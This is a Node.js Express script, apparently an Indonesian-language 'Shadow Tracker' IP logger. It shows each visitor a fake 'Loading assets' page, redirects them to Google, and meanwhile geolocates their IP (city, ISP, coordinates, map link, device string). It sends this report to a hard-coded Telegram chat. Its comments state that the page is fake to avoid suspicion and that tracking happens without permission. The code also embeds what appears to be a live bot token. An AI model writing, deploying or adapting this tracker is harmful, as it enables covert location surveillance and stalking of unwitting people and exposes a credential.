const express = require('express');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const app = express();

const token = '8697794363:AAHLeNQf3OaYJY8JhYrNTuO6ZUPrWE-mga8';
const adminId = '8283778614';
const bot = new TelegramBot(token, {polling: true});

app.get('/', async (req, res) => {
    // 1. Ambil IP Pengunjung
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // 2. Tampilkan Halaman Palsu (Biar Gak Curiga)
    // Bisa lu ganti jadi tampilan "Loading..." atau "Redirecting..."
    res.send(`
        <html>
        <body style="background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh;">
            <div>
                <h2>LOADING ASSETS...</h2>
                <p id="status">Connecting to secure server...</p>
            </div>
            <script>
                setTimeout(() => { window.location.href = "https://www.google.com"; }, 3000);
            </script>
        </body>
        </html>
    `);

    // 3. Proses Tracking (Tanpa Izin)
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
        const d = response.data;

        const report = `
🛰️ **TARGET DETECTED!**
---------------------------
🌐 **IP:** \`${d.query}\`
📍 **CITY:** ${d.city}, ${d.regionName}
🏢 **ISP:** ${d.isp}
🗺️ **COORDS:** \`${d.lat}, ${d.lon}\`
🔗 **MAPS:** https://www.google.com/maps?q=${d.lat},${d.lon}
📱 **DEVICE:** ${req.headers['user-agent']}
---------------------------
*Status: Invisible Tracking Complete*
        `;

        bot.sendMessage(adminId, report, {parse_mode: "Markdown"});
    } catch (error) {
        bot.sendMessage(adminId, "⚠️ Gagal mengambil data IP: " + ip);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Shadow Tracker Active!'));
